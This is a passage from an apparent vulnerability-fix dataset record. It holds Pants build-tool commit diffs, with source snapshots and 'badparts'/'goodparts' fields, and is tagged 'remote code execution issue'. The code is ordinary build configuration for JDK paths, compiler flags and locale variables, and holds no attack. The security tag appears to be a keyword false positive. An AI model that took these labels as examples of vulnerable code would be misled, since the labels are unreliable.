'.join(sorted(val)))\n                                          for key, val in OS_ALIASES.items())\n    register('--paths', advanced=True, type=dict,\n             help='Map of os names to lists of paths to jdks. These paths will be searched before '\n                  'everything else (before the JDK_HOME, JAVA_HOME, PATH environment variables) '\n                  'when locating a jvm to use. The same OS can be specified via several different '\n                  'aliases, according to this map: {}'.format(human_readable_os_aliases))\n    register('--minimum-version', advanced=True, help='Minimum version of the JVM pants will use')\n    register('--maximum-version', advanced=True, help='Maximum version of the JVM pants will use')\n\n  def all_jdk_paths(self):\n    \"\"\"Get all explicitly configured JDK paths.\n\n    :return: mapping of os name -> list of jdk_paths\n    :rtype: dict of string -> list of string\n    \"\"\"\n    return self._normalized_jdk_paths\n\n  @memoized_method\n  def _locator(self):\n    return self._create_locator()\n\n  @memoized_property\n  def _normalized_jdk_paths(self):\n    normalized = {}\n    jdk_paths = self.get_options().paths or {}\n    for name, paths in sorted(jdk_paths.items()):\n      rename = normalize_os_name(name)\n      if rename in normalized:\n        logger.warning('Multiple OS names alias to \"{}\"; combining results.'.format(rename))\n        normalized[rename].extend(paths)\n      else:\n        normalized[rename] = paths\n    return normalized\n\n  def _get_explicit_jdk_paths(self):\n    if not self._normalized_jdk_paths:\n      return ()\n    os_name = normalize_os_name(os.uname()[0].lower())\n    if os_name not in self._normalized_jdk_paths:\n      logger.warning('--jvm-distributions-paths was specified, but has no entry for \"{}\".'\n                     .format(os_name))\n    return self._normalized_jdk_paths.get(os_name, ())\n\n  def _create_locator(self):\n    homes = self._get_explicit_jdk_paths()\n    environment = _UnknownEnvironment(\n        _ExplicitEnvironment(*homes),\n        _UnknownEnvironment(\n            _EnvVarEnvironment(),\n            _LinuxEnvironment.standard(),\n            _OSXEnvironment.standard()\n        )\n    )\n    return _Locator(environment,\n                    self.get_options().minimum_version,\n                    self.get_options().maximum_version)\n"}}, "msg": "Consume the bootstrapper and modify zinc to allow remote exec (#6463)\n\n(This work was made together with @dotordogh and @illicitonion. Even if we used my fork for convenience, we programmed most of the code together. This work is based on @ity's work on the same problem.)\r\n\r\n### Problem\r\n\r\nSee related issues below for discussion.\r\n\r\n### Solution\r\n\r\nWe modify the `zinc` subsystem to call the newly created bootstraper jar.\r\nThat jar will compile the compiler-bridge that we pass to every invocation of zinc.\r\nThe compiled jar is cached in a fingerprinted directory, in the Pants working directory.\r\nThe compilation is made via an ExecuteProcessRequest, which will enable remote execution of the compilation.\r\n\r\n### Result\r\n\r\nFixes #6155."}, "aed9ac61834b5d452644056a6551b99dd7982b41": {"url": "https://api.github.com/repos/fakeNetflix/twitter-repo-pants/commits/aed9ac61834b5d452644056a6551b99dd7982b41", "html_url": "https://github.com/fakeNetflix/twitter-repo-pants/commit/aed9ac61834b5d452644056a6551b99dd7982b41", "sha": "aed9ac61834b5d452644056a6551b99dd7982b41", "keyword": "remote code execution issue", "diff": "diff --git a/src/python/pants/backend/python/register.py b/src/python/pants/backend/python/register.py\nindex 72b224bbe..e6aeb531f 100644\n--- a/src/python/pants/backend/python/register.py\n+++ b/src/python/pants/backend/python/register.py\n@@ -9,6 +9,11 @@\n from pants.backend.python.python_requirement import PythonRequirement\n from pants.backend.python.python_requirements import PythonRequirements\n from pants.backend.python.rules import inject_init, python_test_runner\n+from pants.backend.python.subsystems.python_native_code import PythonNativeCode\n+from pants.backend.python.subsystems.python_native_code import rules as python_native_code_rules\n+from pants.backend.python.subsystems.subprocess_environment import SubprocessEnvironment\n+from pants.backend.python.subsystems.subprocess_environment import \\\n+  rules as subprocess_environment_rules\n from pants.backend.python.targets.python_app import PythonApp\n from pants.backend.python.targets.python_binary import PythonBinary\n from pants.backend.python.targets.python_distribution import PythonDistribution\n@@ -38,6 +43,10 @@\n from pants.goal.task_registrar import TaskRegistrar as task\n \n \n+def global_subsystems():\n+  return (SubprocessEnvironment, PythonNativeCode)\n+\n+\n def build_file_aliases():\n   return BuildFileAliases(\n     targets={\n@@ -81,4 +90,4 @@ def register_goals():\n \n \n def rules():\n-  return inject_init.rules() + python_test_runner.rules()\n+  return inject_init.rules() + python_test_runner.rules() + python_native_code_rules() + subprocess_environment_rules()\ndiff --git a/src/python/pants/backend/python/rules/python_test_runner.py b/src/python/pants/backend/python/rules/python_test_runner.py\nindex 7352fd195..e043e22bc 100644\n--- a/src/python/pants/backend/python/rules/python_test_runner.py\n+++ b/src/python/pants/backend/python/rules/python_test_runner.py\n@@ -4,7 +4,6 @@\n \n from __future__ import absolute_import, division, print_function, unicode_literals\n \n-import os\n import sys\n from builtins import str\n \n@@ -12,7 +11,9 @@\n \n from pants.backend.python.rules.inject_init import InjectedInitDigest\n from pants.backend.python.subsystems.pytest import PyTest\n+from pants.backend.python.subsystems.python_native_code import PexBuildEnvironment\n from pants.backend.python.subsystems.python_setup import PythonSetup\n+from pants.backend.python.subsystems.subprocess_environment import SubprocessEncodingEnvironment\n from pants.engine.fs import (Digest, DirectoriesToMerge, DirectoryWithPrefixToStrip, Snapshot,\n                              UrlToFetch)\n from pants.engine.isolated_process import (ExecuteProcessRequest, ExecuteProcessResult,\n@@ -23,6 +24,7 @@\n from pants.engine.selectors import Get\n from pants.rules.core.core_test_model import Status, TestResult, TestTarget\n from pants.source.source_root import SourceRootConfig\n+from pants.util.strutil import create_path_env_var\n \n \n def parse_interpreter_constraints(python_setup, python_target_adaptors):\n@@ -42,8 +44,8 @@ def parse_interpreter_constraints(python_setup, python_target_adaptors):\n # TODO: Support resources\n # TODO(7697): Use a dedicated rule for removing the source root prefix, so that this rule\n # does not have to depend on SourceRootConfig.\n-@rule(TestResult, [PythonTestsAdaptor, PyTest, PythonSetup, SourceRootConfig])\n-def run_python_test(test_target, pytest, python_setup, source_root_config):\n+@rule(TestResult, [PythonTestsAdaptor, PyTest, PythonSetup, SourceRootConfig, PexBuildEnvironment, SubprocessEncodingEnvironment])\n+def run_python_test(test_target, pytest, python_setup, source_root_config, pex_build_environment, subprocess_encoding_environment):\n   \"\"\"Runs pytest for one target.\"\"\"\n \n   # TODO: Inject versions and digests here through some option, rather than hard-coding it.\n@@ -77,6 +79,7 @@ def run_python_test(test_target, pytest, python_setup, source_root_config):\n   interpreter_constraint_args = parse_interpreter_constraints(\n     python_setup, python_target_adaptors=all_targets\n   )\n+  interpreter_search_paths = text_type(create_path_env_var(python_setup.interpreter_search_paths))\n \n   # TODO: This is non-hermetic because the requirements will be resolved on the fly by\n   # pex27, where it should be hermetically provided in some way.\n@@ -90,9 +93,12 @@ def run_python_test(test_target, pytest, python_setup, source_root_config):\n     # TODO(#7061): This text_type() wrapping can be removed after we drop py2!\n     text_type(req) for req in all_requirements\n   ]\n+  pex_resolve_env = {'PATH': interpreter_search_paths}\n+  # TODO(#6071): merge the two dicts via ** unpacking once we drop Py2.\n+  pex_resolve_env.update(pex_build_environment.invocation_environment_dict)\n   requirements_pex_request = ExecuteProcessRequest(\n     argv=tuple(requirements_pex_argv),\n-    env={'PATH': text_type(os.pathsep.join(python_setup.interpreter_search_paths))},\n+    env=pex_resolve_env,\n     input_files=pex_snapshot.directory_digest,\n     description='Resolve requirements: {}'.format(\", \".join(all_requirements)),\n     output_files=(output_pytest_requirements_pex_filename,),\n@@ -141,9 +147,13 @@ def run_python_test(test_target, pytest, python_setup, source_root_config):\n     DirectoriesToMerge(directories=tuple(all_input_digests)),\n   )\n \n+  pex_exe_env = {'PATH': interpreter_search_paths}\n+  # TODO(#6071): merge the two dicts via ** unpacking once we drop Py2.\n+  pex_exe_env.update(subprocess_encoding_environment.invocation_environment_dict)\n+\n   request = ExecuteProcessRequest(\n     argv=(python_binary, './{}'.format(output_pytest_requirements_pex_filename)),\n-    env={'PATH': text_type(os.pathsep.join(python_setup.interpreter_search_paths))},\n+    env=pex_exe_env,\n     input_files=merged_input_files,\n     description='Run pytest for {}'.format(test_target.address.reference()),\n   )\ndiff --git a/src/python/pants/backend/python/subsystems/python_native_code.py b/src/python/pants/backend/python/subsystems/python_native_code.py\nindex 5ad8d1e4e..ab2d78ec3 100644\n--- a/src/python/pants/backend/python/subsystems/python_native_code.py\n+++ b/src/python/pants/backend/python/subsystems/python_native_code.py\n@@ -5,6 +5,7 @@\n from __future__ import absolute_import, division, print_function, unicode_literals\n \n import logging\n+import os\n from textwrap import dedent\n \n from pants.backend.native.subsystems.native_toolchain import NativeToolchain\n@@ -15,9 +16,11 @@\n from pants.backend.python.targets.python_distribution import PythonDistribution\n from pants.base.exceptions import IncompatiblePlatformsError\n from pants.binaries.executable_pex_tool import ExecutablePexTool\n+from pants.engine.rules import optionable_rule, rule\n from pants.subsystem.subsystem import Subsystem\n from pants.util.memo import memoized_property\n-from pants.util.objects import SubclassesOf\n+from pants.util.objects import SubclassesOf, TypedCollection, datatype, string_type\n+from pants.util.strutil import safe_shlex_join, safe_shlex_split\n \n \n logger = logging.getLogger(__name__)\n@@ -39,6 +42,15 @@ def register_options(cls, register):\n     register('--native-source-extensions', type=list, default=cls.default_native_source_extensions,\n              fingerprint=True, advanced=True,\n              help='The extensions recognized for native source files in `python_dist()` sources.')\n+    # TODO(#7735): move the --cpp-flags and --ld-flags to a general subprocess support subystem.\n+    register('--cpp-flags', type=list,\n+             default=safe_shlex_split(os.environ.get('CPPFLAGS', '')),\n+             fingerprint=True, advanced=True,\n+             help=\"Override the `CPPFLAGS` environment variable for any forked subprocesses.\")\n+    register('--ld-flags', type=list,\n+             default=safe_shlex_split(os.environ.get('LDFLAGS', '')),\n+             fingerprint=True, advanced=True,\n+             help=\"Override the `LDFLAGS` environment variable for any forked subprocesses.\")\n \n   @classmethod\n   def subsystem_dependencies(cls):\n@@ -131,3 +143,31 @@ def base_requirements(self):\n       PythonRequirement('setuptools=={}'.format(self.get_options().setuptools_version)),\n       PythonRequirement('wheel=={}'.format(self.get_options().wheel_version)),\n     ]\n+\n+\n+class PexBuildEnvironment(datatype([\n+    ('cpp_flags', TypedCollection(string_type)),\n+    ('ld_flags', TypedCollection(string_type)),\n+])):\n+\n+  @property\n+  def invocation_environment_dict(self):\n+    return {\n+      'CPPFLAGS': safe_shlex_join(self.cpp_flags),\n+      'LDFLAGS': safe_shlex_join(self.ld_flags),\n+    }\n+\n+\n+@rule(PexBuildEnvironment, [PythonNativeCode])\n+def create_pex_native_build_environment(python_native_code):\n+  return PexBuildEnvironment(\n+    cpp_flags=python_native_code.get_options().cpp_flags,\n+    ld_flags=python_native_code.get_options().ld_flags,\n+  )\n+\n+\n+def rules():\n+  return [\n+    optionable_rule(PythonNativeCode),\n+    create_pex_native_build_environment,\n+  ]\ndiff --git a/src/python/pants/backend/python/subsystems/subprocess_environment.py b/src/python/pants/backend/python/subsystems/subprocess_environment.py\nnew file mode 100644\nindex 000000000..7f83f2e09\n--- /dev/null\n+++ b/src/python/pants/backend/python/subsystems/subprocess_environment.py\n@@ -0,0 +1,57 @@\n+# coding=utf-8\n+# Copyright 2019 Pants project contributors (see CONTRIBUTORS.md).\n+# Licensed under the Apache License, Version 2.0 (see LICENSE).\n+\n+from __future__ import absolute_import, division, print_function, unicode_literals\n+\n+import os\n+\n+from pants.engine.rules import optionable_rule, rule\n+from pants.subsystem.subsystem import Subsystem\n+from pants.util.objects import datatype, string_optional\n+\n+\n+class SubprocessEnvironment(Subsystem):\n+  options_scope = 'subprocess-environment'\n+\n+  @classmethod\n+  def register_options(cls, register):\n+    super(SubprocessEnvironment, cls).register_options(register)\n+\n+    # TODO(#7735): move the --lang and --lc-all flags to a general subprocess support subystem.\n+    register('--lang',\n+             default=os.environ.get('LANG'),\n+             fingerprint=True, advanced=True,\n+             help='Override the `LANG` environment variable for any forked subprocesses.')\n+    register('--lc-all',\n+             default=os.environ.get('LC_ALL'),\n+             fingerprint=True, advanced=True,\n+             help='Override the `LC_ALL` environment variable for any forked subprocesses.')\n+\n+\n+class SubprocessEncodingEnvironment(datatype([\n+    ('lang', string_optional),\n+    ('lc_all', string_optional),\n+])):\n+\n+  @property\n+  def invocation_environment_dict(self):\n+    return {\n+      'LANG': self.lang or '',\n+      'LC_ALL': self.lc_all or '',\n+    }\n+\n+\n+@rule(SubprocessEncodingEnvironment, [SubprocessEnvironment])\n+def create_subprocess_encoding_environment(subprocess_environment):\n+  return SubprocessEncodingEnvironment(\n+    lang=subprocess_environment.get_options().lang,\n+    lc_all=subprocess_environment.get_options().lc_all,\n+  )\n+\n+\n+def rules():\n+  return [\n+    optionable_rule(SubprocessEnvironment),\n+    create_subprocess_encoding_environment,\n+  ]\ndiff --git a/tests/python/pants_test/util/test_contextutil.py b/tests/python/pants_test/util/test_contextutil.py\nindex c4759461c..e062765d3 100644\n--- a/tests/python/pants_test/util/test_contextutil.py\n+++ b/tests/python/pants_test/util/test_contextutil.py\n@@ -29,6 +29,18 @@\n \n class ContextutilTest(unittest.TestCase):\n \n+  @contextmanager\n+  def ensure_user_defined_in_environment(self):\n+    \"\"\"Utility to test for hermetic environments.\"\"\"\n+    original_env = os.environ.copy()\n+    if \"USER\" not in original_env:\n+      os.environ[\"USER\"] = \"pantsbuild\"\n+    try:\n+      yield\n+    finally:\n+      os.environ.clear()\n+      os.environ.update(original_env)\n+\n   def test_empty_environment(self):\n     with environment_as():\n       pass\n@@ -60,27 +72,27 @@ def test_environment_negation(self):\n           self.assertEqual('False\\n', output.read())\n \n   def test_hermetic_environment(self):\n-    self.assertIn('USER', os.environ)\n-    with hermetic_environment_as(**{}):\n-      self.assertNotIn('USER', os.environ)\n+    with self.ensure_user_defined_in_environment():\n+      with hermetic_environment_as():\n+        self.assertNotIn('USER', os.environ)\n \n   def test_hermetic_environment_subprocesses(self):\n-    self.assertIn('USER', os.environ)\n-    with hermetic_environment_as(**dict(AAA='333')):\n-      output = subprocess.check_output('env', shell=True).decode('utf-8')\n-      self.assertNotIn('USER=', output)\n-      self.assertIn('AAA', os.environ)\n-      self.assertEqual(os.environ['AAA'], '333')\n-    self.assertIn('USER', os.environ)\n-    self.assertNotIn('AAA', os.environ)\n+    with self.ensure_user_defined_in_environment():\n+      with hermetic_environment_as(AAA='333'):\n+        output = subprocess.check_output('env', shell=True).decode('utf-8')\n+        self.assertNotIn('USER=', output)\n+        self.assertIn('AAA', os.environ)\n+        self.assertEqual(os.environ['AAA'], '333')\n+      self.assertIn('USER', os.environ)\n+      self.assertNotIn('AAA', os.environ)\n \n   def test_hermetic_environment_unicode(self):\n     UNICODE_CHAR = '\u00a1'\n     ENCODED_CHAR = UNICODE_CHAR.encode('utf-8')\n     expected_output = UNICODE_CHAR if PY3 else ENCODED_CHAR\n-    with environment_as(**dict(XXX=UNICODE_CHAR)):\n+    with environment_as(XXX=UNICODE_CHAR):\n       self.assertEqual(os.environ['XXX'], expected_output)\n-      with hermetic_environment_as(**dict(AAA=UNICODE_CHAR)):\n+      with hermetic_environment_as(AAA=UNICODE_CHAR):\n         self.assertIn('AAA', os.environ)\n         self.assertEqual(os.environ['AAA'], expected_output)\n       self.assertEqual(os.environ['XXX'], expected_output)\n", "message": "", "files": {"/src/python/pants/backend/python/register.py": {"changes": [{"diff": "\n \n \n def rules():\n-  return inject_init.rules() + python_test_runner.rules()\n+  return inject_init.rules() + python_test_runner.rules() + python_native_code_rules() + subprocess_environment_rules()", "add": 1, "remove": 1, "filename": "/src/python/pants/backend/python/register.py", "badparts": ["  return inject_init.rules() + python_test_runner.rules()"], "goodparts": ["  return inject_init.rules() + python_test_runner.rules() + python_native_code_rules() + subprocess_environment_rules()"]}], "source": "\n from __future__ import absolute_import, division, print_function, unicode_literals from pants.backend.python.pants_requirement import PantsRequirement from pants.backend.python.python_artifact import PythonArtifact from pants.backend.python.python_requirement import PythonRequirement from pants.backend.python.python_requirements import PythonRequirements from pants.backend.python.rules import inject_init, python_test_runner from pants.backend.python.targets.python_app import PythonApp from pants.backend.python.targets.python_binary import PythonBinary from pants.backend.python.targets.python_distribution import PythonDistribution from pants.backend.python.targets.python_library import PythonLibrary from pants.backend.python.targets.python_requirement_library import PythonRequirementLibrary from pants.backend.python.targets.python_tests import PythonTests from pants.backend.python.targets.unpacked_whls import UnpackedWheels from pants.backend.python.tasks.build_local_python_distributions import \\ BuildLocalPythonDistributions from pants.backend.python.tasks.gather_sources import GatherSources from pants.backend.python.tasks.isort_prep import IsortPrep from pants.backend.python.tasks.isort_run import IsortRun from pants.backend.python.tasks.local_python_distribution_artifact import \\ LocalPythonDistributionArtifact from pants.backend.python.tasks.pytest_prep import PytestPrep from pants.backend.python.tasks.pytest_run import PytestRun from pants.backend.python.tasks.python_binary_create import PythonBinaryCreate from pants.backend.python.tasks.python_bundle import PythonBundle from pants.backend.python.tasks.python_repl import PythonRepl from pants.backend.python.tasks.python_run import PythonRun from pants.backend.python.tasks.resolve_requirements import ResolveRequirements from pants.backend.python.tasks.select_interpreter import SelectInterpreter from pants.backend.python.tasks.setup_py import SetupPy from pants.backend.python.tasks.unpack_wheels import UnpackWheels from pants.build_graph.build_file_aliases import BuildFileAliases from pants.build_graph.resources import Resources from pants.goal.task_registrar import TaskRegistrar as task def build_file_aliases(): return BuildFileAliases( targets={ PythonApp.alias(): PythonApp, PythonBinary.alias(): PythonBinary, PythonLibrary.alias(): PythonLibrary, PythonTests.alias(): PythonTests, PythonDistribution.alias(): PythonDistribution, 'python_requirement_library': PythonRequirementLibrary, Resources.alias(): Resources, UnpackedWheels.alias(): UnpackedWheels, }, objects={ 'python_requirement': PythonRequirement, 'python_artifact': PythonArtifact, 'setup_py': PythonArtifact, }, context_aware_object_factories={ 'python_requirements': PythonRequirements, PantsRequirement.alias: PantsRequirement, } ) def register_goals(): task(name='interpreter', action=SelectInterpreter).install('pyprep') task(name='build-local-dists', action=BuildLocalPythonDistributions).install('pyprep') task(name='requirements', action=ResolveRequirements).install('pyprep') task(name='sources', action=GatherSources).install('pyprep') task(name='py', action=PythonRun).install('run') task(name='pytest-prep', action=PytestPrep).install('test') task(name='pytest', action=PytestRun).install('test') task(name='py', action=PythonRepl).install('repl') task(name='setup-py', action=SetupPy).install() task(name='py', action=PythonBinaryCreate).install('binary') task(name='py-wheels', action=LocalPythonDistributionArtifact).install('binary') task(name='isort-prep', action=IsortPrep).install('fmt') task(name='isort', action=IsortRun).install('fmt') task(name='py', action=PythonBundle).install('bundle') task(name='unpack-wheels', action=UnpackWheels).install() def rules(): return inject_init.rules() +python_test_runner.rules() ", "sourceWithComments": "# coding=utf-8\n# Copyright 2014 Pants project contributors (see CONTRIBUTORS.md).\n# Licensed under the Apache License, Version 2.0 (see LICENSE).\n\nfrom __future__ import absolute_import, division, print_function, unicode_literals\n\nfrom pants.backend.python.pants_requirement import PantsRequirement\nfrom pants.backend.python.python_artifact import PythonArtifact\nfrom pants.backend.python.python_requirement import PythonRequirement\nfrom pants.backend.python.python_requirements import PythonRequirements\nfrom pants.backend.python.rules import inject_init, python_test_runner\nfrom pants.backend.python.targets.python_app import PythonApp\nfrom pants.backend.python.targets.python_binary import PythonBinary\nfrom pants.backend.python.targets.python_distribution import PythonDistribution\nfrom pants.backend.python.targets.python_library import PythonLibrary\nfrom pants.backend.python.targets.python_requirement_library import PythonRequirementLibrary\nfrom pants.backend.python.targets.python_tests import PythonTests\nfrom pants.backend.python.targets.unpacked_whls import UnpackedWheels\nfrom pants.backend.python.tasks.build_local_python_distributions import \\\n  BuildLocalPythonDistributions\nfrom pants.backend.python.tasks.gather_sources import GatherSources\nfrom pants.backend.python.tasks.isort_prep import IsortPrep\nfrom pants.backend.python.tasks.isort_run import IsortRun\nfrom pants.backend.python.tasks.local_python_distribution_artifact import \\\n  LocalPythonDistributionArtifact\nfrom pants.backend.python.tasks.pytest_prep import PytestPrep\nfrom pants.backend.python.tasks.pytest_run import PytestRun\nfrom pants.backend.python.tasks.python_binary_create import PythonBinaryCreate\nfrom pants.backend.python.tasks.python_bundle import PythonBundle\nfrom pants.backend.python.tasks.python_repl import PythonRepl\nfrom pants.backend.python.tasks.python_run import PythonRun\nfrom pants.backend.python.tasks.resolve_requirements import ResolveRequirements\nfrom pants.backend.python.tasks.select_interpreter import SelectInterpreter\nfrom pants.backend.python.tasks.setup_py import SetupPy\nfrom pants.backend.python.tasks.unpack_wheels import UnpackWheels\nfrom pants.build_graph.build_file_aliases import BuildFileAliases\nfrom pants.build_graph.resources import Resources\nfrom pants.goal.task_registrar import TaskRegistrar as task\n\n\ndef build_file_aliases():\n  return BuildFileAliases(\n    targets={\n      PythonApp.alias(): PythonApp,\n      PythonBinary.alias(): PythonBinary,\n      PythonLibrary.alias(): PythonLibrary,\n      PythonTests.alias(): PythonTests,\n      PythonDistribution.alias(): PythonDistribution,\n      'python_requirement_library': PythonRequirementLibrary,\n      Resources.alias(): Resources,\n      UnpackedWheels.alias(): UnpackedWheels,\n    },\n    objects={\n      'python_requirement': PythonRequirement,\n      'python_artifact': PythonArtifact,\n      'setup_py': PythonArtifact,\n    },\n    context_aware_object_factories={\n      'python_requirements': PythonRequirements,\n      PantsRequirement.alias: PantsRequirement,\n    }\n  )\n\n\ndef register_goals():\n  task(name='interpreter', action=SelectInterpreter).install('pyprep')\n  task(name='build-local-dists', action=BuildLocalPythonDistributions).install('pyprep')\n  task(name='requirements', action=ResolveRequirements).install('pyprep')\n  task(name='sources', action=GatherSources).install('pyprep')\n  task(name='py', action=PythonRun).install('run')\n  task(name='pytest-prep', action=PytestPrep).install('test')\n  task(name='pytest', action=PytestRun).install('test')\n  task(name='py', action=PythonRepl).install('repl')\n  task(name='setup-py', action=SetupPy).install()\n  task(name='py', action=PythonBinaryCreate).install('binary')\n  task(name='py-wheels', action=LocalPythonDistributionArtifact).install('binary')\n  task(name='isort-prep', action=IsortPrep).install('fmt')\n  task(name='isort', action=IsortRun).install('fmt')\n  task(name='py', action=PythonBundle).install('bundle')\n  task(name='unpack-wheels', action=UnpackWheels).install()\n\n\ndef rules():\n  return inject_init.rules() + python_test_runner.rules()\n"}, "/src/python/pants/backend/python/rules/python_test_runner.py": {"changes": [{"diff": "\n # TODO: Support resources\n # TODO(7697): Use a dedicated rule for removing the source root prefix, so that this rule\n # does not have to depend on SourceRootConfig.\n-@rule(TestResult, [PythonTestsAdaptor, PyTest, PythonSetup, SourceRootConfig])\n-def run_python_test(test_target, pytest, python_setup, source_root_config):\n+@rule(TestResult, [PythonTestsAdaptor, PyTest, PythonSetup, SourceRootConfig, PexBuildEnvironment, SubprocessEncodingEnvironment])\n+def run_python_test(test_target, pytest, python_setup, source_root_config, pex_build_environment, subprocess_encoding_environment):\n   \"\"\"Runs pytest for one target.\"\"\"\n \n   # TODO: Inject versions and digests here through some option, rather than hard-coding it.\n", "add": 2, "remove": 2, "filename": "/src/python/pants/backend/python/rules/python_test_runner.py", "badparts": ["@rule(TestResult, [PythonTestsAdaptor, PyTest, PythonSetup, SourceRootConfig])", "def run_python_test(test_target, pytest, python_setup, source_root_config):"], "goodparts": ["@rule(TestResult, [PythonTestsAdaptor, PyTest, PythonSetup, SourceRootConfig, PexBuildEnvironment, SubprocessEncodingEnvironment])", "def run_python_test(test_target, pytest, python_setup, source_root_config, pex_build_environment, subprocess_encoding_environment):"]}, {"diff": "\n     # TODO(#7061): This text_type() wrapping can be removed after we drop py2!\n     text_type(req) for req in all_requirements\n   ]\n+  pex_resolve_env = {'PATH': interpreter_search_paths}\n+  # TODO(#6071): merge the two dicts via ** unpacking once we drop Py2.\n+  pex_resolve_env.update(pex_build_environment.invocation_environment_dict)\n   requirements_pex_request = ExecuteProcessRequest(\n     argv=tuple(requirements_pex_argv),\n-    env={'PATH': text_type(os.pathsep.join(python_setup.interpreter_search_paths))},\n+    env=pex_resolve_env,\n     input_files=pex_snapshot.directory_digest,\n     description='Resolve requirements: {}'.format(\", \".join(all_requirements)),\n     output_files=(output_pytest_requirements_pex_filename,),\n", "add": 4, "remove": 1, "filename": "/src/python/pants/backend/python/rules/python_test_runner.py", "badparts": ["    env={'PATH': text_type(os.pathsep.join(python_setup.interpreter_search_paths))},"], "goodparts": ["  pex_resolve_env = {'PATH': interpreter_search_paths}", "  pex_resolve_env.update(pex_build_environment.invocation_environment_dict)", "    env=pex_resolve_env,"]}, {"diff": "\n     DirectoriesToMerge(directories=tuple(all_input_digests)),\n   )\n \n+  pex_exe_env = {'PATH': interpreter_search_paths}\n+  # TODO(#6071): merge the two dicts via ** unpacking once we drop Py2.\n+  pex_exe_env.update(subprocess_encoding_environment.invocation_environment_dict)\n+\n   request = ExecuteProcessRequest(\n     argv=(python_binary, './{}'.format(output_pytest_requirements_pex_filename)),\n-    env={'PATH': text_type(os.pathsep.join(python_setup.interpreter_search_paths))},\n+    env=pex_exe_env,\n     input_files=merged_input_files,\n     description='Run pytest for {}'.format(test_target.address.reference()),\n   ", "add": 5, "remove": 1, "filename": "/src/python/pants/backend/python/rules/python_test_runner.py", "badparts": ["    env={'PATH': text_type(os.pathsep.join(python_setup.interpreter_search_paths))},"], "goodparts": ["  pex_exe_env = {'PATH': interpreter_search_paths}", "  pex_exe_env.update(subprocess_encoding_environment.invocation_environment_dict)", "    env=pex_exe_env,"]}], "source": "\n from __future__ import absolute_import, division, print_function, unicode_literals import os import sys from builtins import str from future.utils import text_type from pants.backend.python.rules.inject_init import InjectedInitDigest from pants.backend.python.subsystems.pytest import PyTest from pants.backend.python.subsystems.python_setup import PythonSetup from pants.engine.fs import(Digest, DirectoriesToMerge, DirectoryWithPrefixToStrip, Snapshot, UrlToFetch) from pants.engine.isolated_process import(ExecuteProcessRequest, ExecuteProcessResult, FallibleExecuteProcessResult) from pants.engine.legacy.graph import BuildFileAddresses, TransitiveHydratedTargets from pants.engine.legacy.structs import PythonTestsAdaptor from pants.engine.rules import UnionRule, optionable_rule, rule from pants.engine.selectors import Get from pants.rules.core.core_test_model import Status, TestResult, TestTarget from pants.source.source_root import SourceRootConfig def parse_interpreter_constraints(python_setup, python_target_adaptors): constraints={ constraint for target_adaptor in python_target_adaptors for constraint in python_setup.compatibility_or_constraints( getattr(target_adaptor, 'compatibility', None) ) } constraints_args=[] for constraint in sorted(constraints): constraints_args.extend([\"--interpreter-constraint\", text_type(constraint)]) return constraints_args @rule(TestResult,[PythonTestsAdaptor, PyTest, PythonSetup, SourceRootConfig]) def run_python_test(test_target, pytest, python_setup, source_root_config): \"\"\"Runs pytest for one target.\"\"\" url='https://github.com/pantsbuild/pex/releases/download/v1.6.6/pex' digest=Digest('61bb79384db0da8c844678440bd368bcbfac17bbdb865721ad3f9cb0ab29b629', 1826945) pex_snapshot=yield Get(Snapshot, UrlToFetch(url, digest)) transitive_hydrated_targets=yield Get( TransitiveHydratedTargets, BuildFileAddresses((test_target.address,)) ) all_targets=[t.adaptor for t in transitive_hydrated_targets.closure] all_target_requirements=[] for maybe_python_req_lib in all_targets: if hasattr(maybe_python_req_lib, 'requirement'): all_target_requirements.append(str(maybe_python_req_lib.requirement)) if hasattr(maybe_python_req_lib, 'requirements'): for py_req in maybe_python_req_lib.requirements: all_target_requirements.append(str(py_req.requirement)) all_requirements=sorted(all_target_requirements +list(pytest.get_requirement_strings())) python_binary=text_type(sys.executable) interpreter_constraint_args=parse_interpreter_constraints( python_setup, python_target_adaptors=all_targets ) output_pytest_requirements_pex_filename='pytest-with-requirements.pex' requirements_pex_argv=[ python_binary, './{}'.format(pex_snapshot.files[0]), '-e', 'pytest:main', '-o', output_pytest_requirements_pex_filename, ] +interpreter_constraint_args +[ text_type(req) for req in all_requirements ] requirements_pex_request=ExecuteProcessRequest( argv=tuple(requirements_pex_argv), env={'PATH': text_type(os.pathsep.join(python_setup.interpreter_search_paths))}, input_files=pex_snapshot.directory_digest, description='Resolve requirements:{}'.format(\", \".join(all_requirements)), output_files=(output_pytest_requirements_pex_filename,), ) requirements_pex_response=yield Get( ExecuteProcessResult, ExecuteProcessRequest, requirements_pex_request) source_roots=source_root_config.get_source_roots() sources_snapshots_and_source_roots=[] for maybe_source_target in all_targets: if hasattr(maybe_source_target, 'sources'): tgt_snapshot=maybe_source_target.sources.snapshot tgt_source_root=source_roots.find_by_path(maybe_source_target.address.spec_path) sources_snapshots_and_source_roots.append((tgt_snapshot, tgt_source_root)) all_sources_digests=yield[ Get( Digest, DirectoryWithPrefixToStrip( directory_digest=snapshot.directory_digest, prefix=source_root.path ) ) for snapshot, source_root in sources_snapshots_and_source_roots ] sources_digest=yield Get( Digest, DirectoriesToMerge(directories=tuple(all_sources_digests)), ) inits_digest=yield Get(InjectedInitDigest, Digest, sources_digest) all_input_digests=[ sources_digest, inits_digest.directory_digest, requirements_pex_response.output_directory_digest, ] merged_input_files=yield Get( Digest, DirectoriesToMerge, DirectoriesToMerge(directories=tuple(all_input_digests)), ) request=ExecuteProcessRequest( argv=(python_binary, './{}'.format(output_pytest_requirements_pex_filename)), env={'PATH': text_type(os.pathsep.join(python_setup.interpreter_search_paths))}, input_files=merged_input_files, description='Run pytest for{}'.format(test_target.address.reference()), ) result=yield Get(FallibleExecuteProcessResult, ExecuteProcessRequest, request) status=Status.SUCCESS if result.exit_code==0 else Status.FAILURE yield TestResult( status=status, stdout=result.stdout.decode('utf-8'), stderr=result.stderr.decode('utf-8'), ) def rules(): return[ run_python_test, UnionRule(TestTarget, PythonTestsAdaptor), optionable_rule(PyTest), optionable_rule(PythonSetup), optionable_rule(SourceRootConfig), ] ", "sourceWithComments": "# coding=utf-8\n# Copyright 2018 Pants project contributors (see CONTRIBUTORS.md).\n# Licensed under the Apache License, Version 2.0 (see LICENSE).\n\nfrom __future__ import absolute_import, division, print_function, unicode_literals\n\nimport os\nimport sys\nfrom builtins import str\n\nfrom future.utils import text_type\n\nfrom pants.backend.python.rules.inject_init import InjectedInitDigest\nfrom pants.backend.python.subsystems.pytest import PyTest\nfrom pants.backend.python.subsystems.python_setup import PythonSetup\nfrom pants.engine.fs import (Digest, DirectoriesToMerge, 